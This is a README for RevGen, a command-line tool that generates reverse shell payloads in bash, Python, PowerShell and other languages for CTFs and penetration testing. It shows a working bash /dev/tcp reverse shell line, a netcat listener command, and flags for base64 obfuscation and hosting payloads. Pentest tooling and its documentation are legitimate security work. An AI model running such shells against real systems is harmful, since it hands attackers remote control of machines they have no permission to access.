# 🧞‍♂️ RevGen - Reverse Shell

<div align="center">

```

$$$$$$$\                             $$$$$$\                      
$$  __$$\                           $$  __$$\                     
$$ |  $$ | $$$$$$\ $$\    $$\       $$ /  \__| $$$$$$\  $$$$$$$\  
$$$$$$$  |$$  __$$ $$$\  $$  |      $$ |$$$$\ $$  __$$\ $$  __$$\ 
$$  __$$< $$$$$$$$ |\$$\$$  /       $$ |\_$$ |$$$$$$$$ |$$ |  $$ |
$$ |  $$ |$$   ____| \$$$  /        $$ |  $$ |$$   ____|$$ |  $$ |
$$ |  $$ |\$$$$$$$\   \$  /         \$$$$$$  |\$$$$$$$\ $$ |  $$ |
\__|  \__| \_______|   \_/           \______/  \_______|\__|  \__|
                                                                  


```

**Your magical spellbook for terminal takeovers**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.6+](https://img.shields.io/badge/python-3.6+-blue.svg)](https://www.python.org/downloads/)
[![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macOS%20%7C%20windows-lightgrey)](https://github.com/karthikm/revgen)

*A CLI tool that conjures ready-to-use reverse shell payloads in multiple languages.*

</div>

---

## ⚡ What is RevGen?

RevGen is your portable spellbook for **CTFs**, **pentesting demos**, **red team exercises**, or just showing off terminal magic that makes people go *"wtf you can do THAT??"*

No more Googling "bash reverse shell" every 5 minutes. No more copy-pasting sketchy payloads from random forums. RevGen generates clean, tested, ready-to-deploy reverse shells faster than you can say "I'm in".

---

## ✨ Features

### 🔮 **Multi-Language Payload Generation**
Generate reverse shells in **14+ languages**:
- **bash**, **sh**, **python**, **python3**, **perl**, **php**, **ruby** 
- **powershell**, **golang**, **netcat**, **socat**, **node.js**, **java**

### ⚡ **Lightning Fast Usage**
```bash
# Single payload
revgen --ip 192.168.1.100 --port 4444 --lang bash

# All payloads at once  
revgen --ip 10.0.0.5 --port 9001 --all

# Copy to clipboard
revgen --ip 192.168.1.50 --port 4444 --lang python --copy
```

### 🌍 **IPv4 + IPv6 Support**
Automatically detects IP version and formats payloads correctly:
```bash
revgen --ip 2001:db8::1 --port 8080 --lang bash
# Output: bash -i >& /dev/tcp/[2001:db8::1]/8080 0>&1
```

### 🧩 **Obfuscation Mode**
Base64-encode payloads for stealthy delivery:
```bash
revgen --ip 10.0.0.5 --port 4444 --lang php --obfuscate
# Output: php -r 'eval(base64_decode("..."));'
```

### 📋 **Clipboard Integration**
Instantly copy generated payloads:
```bash
revgen --ip 192.168.1.100 --port 4444 --lang bash --copy
# 🎯 Payload copied to clipboard!
```

### 🔥 **Hollywood Hacker Mode**
Enable fancy ASCII art and styling:
```bash
revgen --ip 10.0.0.5 --port 4444 --all --fancy
```

### 🌐 **Built-in Web Server**
Host payloads on a local web server for team access:
```bash
revgen --ip 192.168.1.100 --port 4444 --all --server
# 🌐 Web server started: http://192.168.1.50:8080
```

### 🎯 **Smart IP Detection**
```bash
# Auto-detect public IP
revgen --auto-ip --port 4444 --lang bash

# Use local IP
revgen --local-ip --port 4444 --lang python
```

---

## 🚀 Installation

### Quick Install (Recommended)
```bash
# Clone and install
git clone https://github.com/karthikm/revgen.git
cd revgen
pip install -e .

# Or install from PyPI (when published)
pip install revgen
```

### Manual Setup
```bash
git clone https://github.com/karthikm/revgen.git
cd revgen
python revgen.py --help
```

### Requirements
- **Python 3.6+** (that's it! 🎉)
- No external dependencies for core functionality
- Optional: `qrcode`, `pyperclip` for extra features

---

## 📚 Usage Examples

### Basic Usage
```bash
# Generate a bash reverse shell
revgen --ip 192.168.1.100 --port 4444 --lang bash

# List all available shell types
revgen --list

# Generate all payloads with fancy output
revgen --ip 10.0.0.5 --port 9001 --all --fancy
```

### Advanced Features
```bash
# Obfuscated PowerShell payload
revgen --ip 192.168.1.100 --port 4444 --lang powershell --obfuscate

# Auto-detect IP and copy to clipboard
revgen --auto-ip --port 4444 --lang python --copy

# Start web server with all payloads
revgen --ip 192.168.1.100 --port 4444 --all --server --server-port 8080

# Check if listener is running
revgen --ip 192.168.1.100 --port 4444 --check-listener

# Get listener command suggestions
revgen --port 4444 --suggest-listener
```

### Workflow Integration
```bash
# Step 1: Start listener
nc -lvnp 4444

# Step 2: Generate and copy payload
revgen --auto-ip --port 4444 --lang bash --copy

# Step 3: Paste on target and execute
# Step 4: Profit! 💰
```

---

## 🎭 Output Modes

### Standard Mode
```
[Bash]
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
💡 Classic bash reverse shell using /dev/tcp
```

### Fancy Mode
```
╔════════════════════════════════════════════════════════════╗
║                            Bash                            ║
╠════════════════════════════════════════════════════════════╣
║ bash -i >& /dev/tcp/192.168.1.100/4444 0>&1               ║
╚════════════════════════════════════════════════════════════╝
💡 Classic bash reverse shell using /dev/tcp
```

---

## 🔧 Supported Shells

| Language | IPv4 | IPv6 | Obfuscation | Description |
|----------|------|------|-------------|-------------|
| **bash** | ✅ | ✅ | ✅ | Classic `/dev/tcp` method |
| **python** | ✅ | ✅ | ✅ | Socket-based with subprocess |
| **php** | ✅ | ❌ | ✅ | fsockopen method |
| **powershell** | ✅ | ❌ | ✅ | Windows PowerShell |
| **netcat** | ✅ | ✅ | ✅ | Traditional netcat |
| **socat** | ✅ | ❌ | ❌ | Full TTY support |
| **ruby** | ✅ | ❌ | ✅ | TCPSocket method |
| **perl** | ✅ | ❌ | ✅ | Socket module |
| **golang** | ✅ | ❌ | ❌ | Compile and execute |
| **node.js** | ✅ | ❌ | ✅ | JavaScript reverse shell |
| **java** | ✅ | ❌ | ❌ | Java socket connection |

---

## 🎯 Real-World Usage

### CTF Scenarios
```bash
# Quick bash shell for Linux box
revgen --ip 10.10.14.50 --port 9001 --lang bash --copy

# Windows target? Use PowerShell
revgen --ip 10.10.14.50 --port 4444 --lang powershell --obfuscate
```

### Penetration Testing
```bash
# Generate all payloads for comprehensive testing
revgen --auto-ip --port 4444 --all --server

# Test specific interpreter availability
revgen --ip target_ip --port 4444 --lang python3 --copy
```

### Red Team Exercises
```bash
# Stealthy obfuscated payload
revgen --ip c2_server --port 443 --lang python --obfuscate --copy

# Web-hosted payloads for team coordination
revgen --ip c2_server --port 4444 --all --server --server-port 8080
```

---

## 🛠️ Advanced Configuration

### Environment Variables
```bash
export REVGEN_DEFAULT_IP="192.168.1.100"
export REVGEN_DEFAULT_PORT="4444"
export REVGEN_FANCY_MODE="true"
```

### Custom Shell Templates
Edit `shells.json` to add your own payload templates:
```json
{
  "shells": {
    "custom_shell": {
      "name": "Custom Shell",
      "payload": "your_custom_command {ip} {port}",
      "description": "Your custom reverse shell",
      "requirements": "custom_interpreter"
    }
  }
}
```

---

## 🔒 Security & Legal

### ⚠️ **IMPORTANT DISCLAIMER**

This tool is for **educational purposes**, **authorized penetration testing**, and **security research** only.

- ✅ **Authorized testing on your own systems**
- ✅ **CTF competitions and practice labs** 
- ✅ **Educational security research**
- ✅ **Penetration testing with written permission**

- ❌ **Unauthorized access to systems you don't own**
- ❌ **Malicious attacks on third-party systems**
- ❌ **Any illegal activities**

**By using RevGen, you agree to use it responsibly and lawfully. The authors are not responsible for any misuse.**

### Best Practices
1. **Always obtain written permission** before testing
2. **Use only in controlled environments** (labs, VMs, owned systems)
3. **Document your testing activities** for compliance
4. **Follow responsible disclosure** for any findings

---

## 🤝 Contributing

We welcome contributions! Here's how to get involved:

### Development Setup
```bash
git clone https://github.com/karthikm/revgen.git
cd revgen
pip install -e ".[dev]"
pytest tests/
```

### Adding New Shells
1. Edit `shells.json` with your payload template
2. Test the payload works correctly
3. Add IPv6 variant if supported
4. Submit a pull request

### Feature Requests
- 🎭 More obfuscation methods
- 🌐 Additional shell languages
- 🚀 Cloud integration features
- 🔧 Custom payload builders

---

## 📊 Project Stats

```bash
# Check project statistics
revgen --list
# 📊 Total: 14 shells, 3 IPv6 variants
```

---

## 🎉 Hall of Fame

### Shell Languages Supported
- 🐚 **Shell**: bash, sh, zsh compatibility
- 🐍 **Python**: 2.7, 3.x support with IPv6
- 🌐 **Web**: PHP, Node.js, Ruby
- 💻 **System**: PowerShell, Go, Java
- 🔧 **Network**: Netcat, Socat variants

### Notable Features
- **Zero external dependencies** for core functionality
- **Cross-platform support** (Linux, macOS, Windows)
- **IPv6 ready** for modern networks
- **Clipboard integration** across all platforms
- **Web server mode** for team collaboration

---

## 📞 Support

### Documentation
- 📖 **Full documentation**: [GitHub Wiki](https://github.com/karthikm/revgen/wiki)
- 🎥 **Video tutorials**: [YouTube Playlist](https://youtube.com/playlist)
- 💬 **Community Discord**: [Join Here](https://discord.gg/revgen)

### Getting Help
- 🐛 **Bug reports**: [GitHub Issues](https://github.com/karthikm/revgen/issues)
- 💡 **Feature requests**: [GitHub Discussions](https://github.com/karthikm/revgen/discussions)
- 📧 **Security issues**: security@revgen.dev

---

## 🏆 Acknowledgments

### Inspiration
- The countless late-night CTF sessions where we needed "just one more reverse shell"
- The pentesting community's endless creativity
- Every hacker who's ever typed `nc -lvnp 4444`

### Special Thanks
- **Contributors** who added shell variants
- **Security researchers** who tested and validated payloads
- **CTF organizers** who keep the learning spirit alive

---

## 📝 License

MIT License - see [LICENSE](LICENSE) for details.

**TL;DR**: Free to use, modify, and distribute. Just don't be evil. 😈

---

<div align="center">

### 🧞‍♂️ *"Your wish for the perfect reverse shell is my command!"* 🧞‍♂️

**Made with ❤️ by security enthusiasts, for security enthusiasts**

[⭐ Star this repo](https://github.com/karthikm/revgen) • [🍴 Fork it](https://github.com/karthikm/revgen/fork) • [📢 Share it](https://twitter.com/intent/tweet?text=Check%20out%20RevGen%20-%20the%20ultimate%20reverse%20shell%20generator!%20%F0%9F%A7%9E%E2%80%8D%E2%99%82%EF%B8%8F&url=https://github.com/karthikm/revgen)

---

*Remember: With great power comes great responsibility. Use your powers for good! 🦸‍♂️*

</div>
